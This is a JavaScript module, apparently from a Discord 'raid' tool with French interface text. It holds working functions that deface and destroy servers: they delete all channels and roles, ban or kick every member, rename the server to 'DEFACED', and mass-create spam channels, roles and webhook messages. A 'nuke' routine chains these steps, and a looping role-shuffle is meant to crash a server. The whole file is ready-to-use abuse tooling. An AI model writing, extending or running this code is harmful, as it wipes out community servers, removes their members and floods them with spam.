const raidModule = {
    showPruneModal() {
        ui.showModal(`
            <h2>🧹 Prune Members</h2>
            <p>Supprime les membres inactifs depuis 7 jours</p>
            <input type="text" id="prune-server-id" placeholder="ID du serveur" />
            <button onclick="raidModule.pruneMembers()" class="danger-btn">Prune</button>
        `);
    },

    async pruneMembers() {
        const serverId = document.getElementById('prune-server-id').value.trim();
        if (!serverId) {
            alert('Veuillez entrer un ID de serveur');
            return;
        }

        if (!confirm('⚠️ Prune les membres inactifs (7 jours) ?')) return;

        ui.closeModal();

        try {
            log('Lancement du prune...', 'warning');
            
            const result = await discordFetch(`/guilds/${serverId}/prune`, {
                method: 'POST',
                body: JSON.stringify({ days: 7 })
            });
            
            log(`✅ ${result.pruned || 0} membres inactifs prunés`, 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    showRoleUpModal() {
        ui.showModal(`
            <h2>🔄 Role Up Crash</h2>
            <p>Crash un serveur en déplaçant les rôles en boucle</p>
            <input type="text" id="roleup-server-id" placeholder="ID du serveur" />
            <button onclick="raidModule.startRoleUpCrash()" class="danger-btn">Démarrer</button>
            <button onclick="raidModule.stopRoleUpCrash()" class="danger-btn">Arrêter</button>
        `);
    },

    roleUpIntervals: {},

    async startRoleUpCrash() {
        const serverId = document.getElementById('roleup-server-id').value.trim();
        if (!serverId) {
            alert('Veuillez entrer un ID de serveur');
            return;
        }

        if (this.roleUpIntervals[serverId]) {
            log('❌ Un crash est déjà actif sur ce serveur', 'error');
            return;
        }

        if (!confirm('⚠️ DÉMARRER LE CRASH ROLE UP ?')) return;

        ui.closeModal();

        try {
            log('🔄 DÉBUT DU ROLE UP CRASH', 'warning');
            
            const crashRoles = async () => {
                try {
                    const roles = await discordFetch(`/guilds/${serverId}/roles`);
                    
                    const editableRoles = roles.filter(role => role.name !== '@everyone' && !role.managed);
                    
                    const shuffled = editableRoles.map(role => ({
                        id: role.id,
                        position: Math.floor(Math.random() * editableRoles.length) + 1
                    }));
                    
                    await discordFetchNoError(`/guilds/${serverId}/roles`, {
                        method: 'PATCH',
                        body: JSON.stringify(shuffled)
                    });
                    
                    log('✓ Rôles déplacés', 'success');
                } catch (error) {
                    log(`✗ Erreur: ${error.message}`, 'error');
                }
            };

            crashRoles();
            this.roleUpIntervals[serverId] = setInterval(crashRoles, 1000);
            
            log('🔄 ROLE UP CRASH ACTIF', 'warning');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    stopRoleUpCrash() {
        const serverId = document.getElementById('roleup-server-id').value.trim();
        if (!serverId) {
            alert('Veuillez entrer un ID de serveur');
            return;
        }

        if (!this.roleUpIntervals[serverId]) {
            log('❌ Aucun crash actif sur ce serveur', 'error');
            return;
        }

        clearInterval(this.roleUpIntervals[serverId]);
        delete this.roleUpIntervals[serverId];
        
        log('✅ ROLE UP CRASH ARRÊTÉ', 'success');
        ui.closeModal();
    },

    showDefaceModal() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) {
            alert('Veuillez entrer un ID de serveur');
            return;
        }
        
        ui.showModal(`
            <h2>🔥 Deface Server</h2>
            <p>Supprime tous les salons, crée un salon "deface" et renomme le serveur</p>
            <input type="text" id="deface-server-id" value="${serverId}" placeholder="ID du serveur" />
            <input type="text" id="deface-server-name" placeholder="Nouveau nom du serveur" value="DEFACED" />
            <input type="text" id="deface-channel-name" placeholder="Nom du salon" value="deface" />
            <button onclick="raidModule.executeDeface()" class="danger-btn">🔥 Exécuter Deface</button>
        `);
    },

    async executeDeface() {
        const serverId = document.getElementById('deface-server-id').value.trim();
        const serverName = document.getElementById('deface-server-name').value.trim();
        const channelName = document.getElementById('deface-channel-name').value.trim();
        
        if (!confirm('⚠️ DEFACE CE SERVEUR ?')) return;
        
        ui.closeModal();
        
        try {
            log('🔥 DÉBUT DU DEFACE', 'warning');
            
            log('Suppression rapide des salons...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Salon supprimé: ${channel.name}`, 'success'))
            );
            
            log('Renommage du serveur...', 'warning');
            discordFetchNoError(`/guilds/${serverId}`, {
                method: 'PATCH',
                body: JSON.stringify({ name: serverName })
            }).then(() => log(`✓ Serveur renommé: ${serverName}`, 'success'));
            
            log('Création du salon deface...', 'warning');
            discordFetchNoError(`/guilds/${serverId}/channels`, {
                method: 'POST',
                body: JSON.stringify({ name: channelName, type: 0 })
            }).then(() => log(`✓ Salon créé: ${channelName}`, 'success'));
            
            log('🔥 DEFACE TERMINÉ', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    showWebhookSpamModal() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) {
            alert('Veuillez entrer un ID de serveur');
            return;
        }
        
        ui.showModal(`
            <h2>📢 Webhook Spam</h2>
            <p>Crée 2 webhooks par salon et spam avec un message</p>
            <input type="text" id="webhook-server-id" value="${serverId}" placeholder="ID du serveur" />
            <textarea id="webhook-message" rows="3" placeholder="Message à spam">RAIDED</textarea>
            <input type="number" id="webhook-spam-count" placeholder="Nombre de messages par webhook" value="10" />
            <button onclick="raidModule.executeWebhookSpam()" class="danger-btn">📢 Exécuter Spam</button>
        `);
    },

    async executeWebhookSpam() {
        const serverId = document.getElementById('webhook-server-id').value.trim();
        const message = document.getElementById('webhook-message').value.trim();
        const spamCount = parseInt(document.getElementById('webhook-spam-count').value) || 10;
        
        if (!confirm('⚠️ SPAM WEBHOOKS ?')) return;
        
        ui.closeModal();
        
        try {
            log('📢 DÉBUT DU WEBHOOK SPAM', 'warning');
            
            log('Récupération des salons...', 'info');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            const textChannels = channels.filter(c => c.type === 0);
            
            log(`Création de webhooks dans ${textChannels.length} salons...`, 'warning');
            
            const webhooks = [];
            
            for (const channel of textChannels) {
                const webhook1 = await discordFetchNoError(`/channels/${channel.id}/webhooks`, {
                    method: 'POST',
                    body: JSON.stringify({ name: 'raided' })
                });
                
                if (webhook1) {
                    webhooks.push(webhook1);
                    log(`✓ Webhook créé dans ${channel.name}`, 'success');
                    
                    for (let i = 0; i < spamCount; i++) {
                        await fetch(`https://discord.com/api/webhooks/${webhook1.id}/${webhook1.token}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: message })
                        }).catch(() => {});
                    }
                }
                
                const webhook2 = await discordFetchNoError(`/channels/${channel.id}/webhooks`, {
                    method: 'POST',
                    body: JSON.stringify({ name: 'raided' })
                });
                
                if (webhook2) {
                    webhooks.push(webhook2);
                    
                    for (let i = 0; i < spamCount; i++) {
                        await fetch(`https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: message })
                        }).catch(() => {});
                    }
                }
            }
            
            log('📢 WEBHOOK SPAM LANCÉ', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async spamChannels() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        const count = prompt('Combien de salons créer ?', '50');
        if (!count) return;
        
        try {
            log(`Création de ${count} salons...`, 'warning');
            
            for (let i = 0; i < parseInt(count); i++) {
                await discordFetchNoError(`/guilds/${serverId}/channels`, {
                    method: 'POST',
                    body: JSON.stringify({ name: `raided-${i}`, type: 0 })
                });
                log(`✓ Salon ${i + 1}/${count} créé`, 'success');
            }
            
            log('✅ Spam de salons terminé', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async spamRoles() {
        const serverId = document.getElementById('raid-server-id').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        const count = prompt('Combien de rôles créer ?', '50');
        if (!count) return;
        
        try {
            log(`Création de ${count} rôles...`, 'warning');
            
            for (let i = 0; i < parseInt(count); i++) {
                await discordFetchNoError(`/guilds/${serverId}/roles`, {
                    method: 'POST',
                    body: JSON.stringify({
                        name: `raided-${i}`,
                        color: Math.floor(Math.random() * 16777215)
                    })
                });
                log(`✓ Rôle ${i + 1}/${count} créé`, 'success');
            }
            
            log('✅ Spam de rôles terminé', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async deleteChannels() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        if (!confirm('⚠️ SUPPRIMER TOUS LES SALONS ?')) return;
        
        try {
            log('Récupération des salons...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            
            log(`Suppression rapide de ${channels.length} salons...`, 'warning');
            
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Salon supprimé: ${channel.name}`, 'success'))
            );
            
            log('✅ Suppression des salons lancée', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async deleteRoles() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        if (!confirm('⚠️ SUPPRIMER TOUS LES RÔLES ?')) return;
        
        try {
            log('Récupération des rôles...', 'warning');
            const roles = await discordFetch(`/guilds/${serverId}/roles`);
            
            log(`Suppression de ${roles.length} rôles...`, 'warning');
            
            roles.forEach(role => {
                if (!role.managed && role.name !== '@everyone') {
                    discordFetchNoError(`/guilds/${serverId}/roles/${role.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Rôle supprimé: ${role.name}`, 'success'));
                }
            });
            
            log('✅ Suppression des rôles lancée', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async banAll() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        if (!confirm('⚠️ BANNIR TOUS LES MEMBRES ?')) return;
        
        try {
            log('Récupération des membres...', 'warning');
            let members = [];
            let after = '0';
            
            while (true) {
                const batch = await discordFetch(`/guilds/${serverId}/members?limit=1000&after=${after}`);
                if (batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            log(`Bannissement de ${members.length} membres...`, 'warning');
            
            members.forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/bans/${member.user.id}`, {
                        method: 'PUT',
                        body: JSON.stringify({ delete_message_days: 7 })
                    }).then(() => log(`✓ Banni: ${member.user.username}`, 'success'));
                }
            });
            
            log('✅ Bannissement lancé', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async kickAll() {
        const serverId = document.getElementById('raid-server-id-2').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        if (!confirm('⚠️ KICK TOUS LES MEMBRES ?')) return;
        
        try {
            log('Récupération des membres...', 'warning');
            let members = [];
            let after = '0';
            
            while (true) {
                const batch = await discordFetch(`/guilds/${serverId}/members?limit=1000&after=${after}`);
                if (batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            log(`Kick de ${members.length} membres...`, 'warning');
            
            members.forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/members/${member.user.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Kick: ${member.user.username}`, 'success'));
                }
            });
            
            log('✅ Kick lancé', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    },

    async nuke() {
        const serverId = document.getElementById('raid-server-id-3').value.trim();
        if (!serverId) return alert('Veuillez entrer un ID de serveur');
        
        if (!confirm('⚠️⚠️⚠️ NUKE COMPLET DU SERVEUR ? TOUT SERA DÉTRUIT ! ⚠️⚠️⚠️')) return;
        if (!confirm('Dernière confirmation: ÊTES-VOUS ABSOLUMENT SÛR ?')) return;
        
        try {
            log('☢️ DÉBUT DU NUKE ☢️', 'error');
            
            log('Suppression des salons...', 'warning');
            const channels = await discordFetch(`/guilds/${serverId}/channels`);
            channels.forEach(channel => 
                discordFetchNoError(`/channels/${channel.id}`, { method: 'DELETE' })
                    .then(() => log(`✓ Salon supprimé: ${channel.name}`, 'success'))
            );
            
            log('Suppression des rôles...', 'warning');
            const roles = await discordFetch(`/guilds/${serverId}/roles`);
            roles.forEach(role => {
                if (!role.managed && role.name !== '@everyone') {
                    discordFetchNoError(`/guilds/${serverId}/roles/${role.id}`, { method: 'DELETE' })
                        .then(() => log(`✓ Rôle supprimé: ${role.name}`, 'success'));
                }
            });
            
            log('Création de salons de spam...', 'warning');
            for (let i = 0; i < 50; i++) {
                await discordFetchNoError(`/guilds/${serverId}/channels`, {
                    method: 'POST',
                    body: JSON.stringify({ name: `nuked-${i}`, type: 0 })
                });
            }
            
            log('Bannissement des membres...', 'warning');
            let members = [];
            let after = '0';
            while (members.length < 50) {
                const batch = await discordFetchNoError(`/guilds/${serverId}/members?limit=50&after=${after}`);
                if (!batch || batch.length === 0) break;
                members = members.concat(batch);
                after = batch[batch.length - 1].user.id;
            }
            
            members.slice(0, 50).forEach(member => {
                if (member.user.id !== userData.id) {
                    discordFetchNoError(`/guilds/${serverId}/bans/${member.user.id}`, {
                        method: 'PUT',
                        body: JSON.stringify({ delete_message_days: 7 })
                    });
                }
            });
            
            log('☢️ NUKE LANCÉ ☢️', 'error');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    }
};
